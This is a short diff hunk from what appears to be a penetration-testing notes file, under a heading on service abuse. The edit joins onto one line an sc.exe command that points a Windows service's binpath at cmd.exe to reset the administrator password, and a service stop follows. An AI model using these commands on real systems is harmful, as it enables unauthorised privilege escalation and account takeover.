@@ -286,9 +286,7 @@ services
 
 # Service abusing
 
-sc.exe config browser
-
-binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
+sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
 
 sc.exe stop browser
 
